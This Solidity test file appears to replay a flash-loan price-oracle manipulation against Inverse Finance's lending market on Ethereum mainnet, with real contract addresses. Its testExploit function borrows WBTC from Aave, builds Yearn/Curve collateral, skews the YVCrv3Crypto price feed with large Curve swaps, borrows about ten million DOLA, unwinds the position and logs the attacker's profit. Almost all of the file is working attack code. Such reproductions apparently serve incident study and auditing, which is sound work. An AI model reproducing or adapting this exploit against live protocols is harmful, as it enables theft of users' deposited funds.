// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "ds-test/test.sol";
import "./interface.sol";

contract ContractTest is DSTest {

    IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    USDT usdt = USDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 DOLA = IERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4);
    IAToken awbtc = IAToken(0x9ff58f4fFB29fA2266Ab25e75e2A8b3503311656);

    ILendingPool  aaveLendingPool   = ILendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    VyperContract curveVyper_contract = VyperContract(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46);
    IERC20 crv3crypto =IERC20(0xc4AD29ba4B3c580e6D59105FFf484999997675Ff);
    VyperContract yvCurve3Crypto= VyperContract(0xE537B5cc158EB71037D4125BDD7538421981E6AA);
    VyperContract curveRegistry = VyperContract(0x8e764bE4288B842791989DB5b8ec067279829809);
    VyperContract dola3pool3crv = VyperContract(0xAA5A67c256e27A5d80712c51971408db3370927D);
    VyperContract curve3pool  = VyperContract(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    CErc20Interface anYvCrv3CryptoInverse  = CErc20Interface(0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587);
    IUnitroller Unitroller = IUnitroller(0x4dCf7407AE5C07f8681e1659f626E114A7667339);
    IAggregator YVCrv3CryptoFeed = IAggregator(0xE8b3bC58774857732C6C1147BFc9B9e5Fb6F427C);
    CErc20Interface InverseFinanceDola = CErc20Interface(0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670);
    IERC20 crv3 = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
    address[] assets = [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599];
    uint256[] amounts = [2700000000000];
    uint256[] modes = [0];
    uint256[3] amounts2 = [0, 22500000000, 0];

    
    function testExploit() public{
         
        aaveLendingPool.flashLoan(address(this),assets,amounts,modes,address(this),"0x",0);
        emit log_named_uint("After flashloan repaid, profit in WBTC of attacker:", WBTC.balanceOf(address(this))); 
    }

  function executeOperation(
    address[] memory assets,
    uint256[] memory amounts,
    uint256[] memory premiums,
    address initiator,
    bytes memory params
  ) public  returns (bool) {
    assets;
    amounts;
    premiums;
    params;
    initiator;
 
    WBTC.approve(address(curveVyper_contract),type(uint256).max);
    WBTC.approve(address(curveRegistry),type(uint256).max);
    usdt.approve(address(curveRegistry),type(uint256).max); 
    DOLA.approve(address(curveRegistry),type(uint256).max); 
    crv3crypto.approve(0xE537B5cc158EB71037D4125BDD7538421981E6AA,type(uint256).max);

   emit log_named_uint("Flashloaned, WBTC balance of attacker:", WBTC.balanceOf(address(this))/1e8);

   curveVyper_contract.add_liquidity(amounts2,0); 
   emit log_named_uint("After add-liquidity, crv3crypto balance of attacker:", crv3crypto.balanceOf(address(this)));
   emit log_named_uint("After add-liquidity, WBTC balance of attacker:", WBTC.balanceOf(address(this))/1e8);
   yvCurve3Crypto.deposit(5375596969399930881565,address(this));
   emit log_named_uint("Deposited to Yearns Vault, yvCurve3 balance of attacker:", yvCurve3Crypto.balanceOf(address(this)));
  yvCurve3Crypto.approve(0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587,100000000000000000000000000000000000000000000000000);
  anYvCrv3CryptoInverse.mint(4906754677503974414310);
  emit log_named_uint("Deposited to Inverse Yearn 3Crypto Vault, anYvCrv3Crypto balance of attacker:", anYvCrv3CryptoInverse.balanceOf(address(this)));
  address[] memory toEnter = new address[](1);
  toEnter[0] = 0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587 ;
  Unitroller.enterMarkets(toEnter);

  emit log_named_int("YVCrv3CryptoFeed lastanswer:", YVCrv3CryptoFeed.latestAnswer());
  curveRegistry.exchange(address(curveVyper_contract),address(WBTC),address(usdt),2677500000000,0,address(this));
  emit log_named_uint("After swapped, USDT balance of attacker:", usdt.balanceOf(address(this)));
  emit log_named_int("Manipulated YVCrv3CryptoFeed lastanswer:", YVCrv3CryptoFeed.latestAnswer());
  InverseFinanceDola.borrow(10133949192393802606886848);
  emit log_named_uint("DOLA balance of attacker:", DOLA.balanceOf(address(this)));
  curveRegistry.exchange(address(curveVyper_contract),address(usdt),address(WBTC),75403376186072,0,address(this));
  emit log_named_uint("After swapped, WBTC balance of attacker:", WBTC.balanceOf(address(this))/1e8);
  curveRegistry.exchange(address(dola3pool3crv),address(DOLA),address(crv3),10133949192393802606886848,0,address(this));
  emit log_named_uint("After swapped,3crv balance of attacker:", crv3.balanceOf(address(this)));
  curve3pool.remove_liquidity_one_coin(9881355040729892287779421,2,0);
  emit log_named_uint("After swapped, USDT balance of attacker:", usdt.balanceOf(address(this)));
   curveRegistry.exchange(address(curveVyper_contract),address(usdt),address(WBTC),10000000000000,0,address(this));
  emit log_named_uint("After swapped, WBTC balance of attacker:", WBTC.balanceOf(address(this))); 
  WBTC.approve(address(aaveLendingPool),2702430000000);
  
  return true;
  }
  
    receive() payable external{}
}





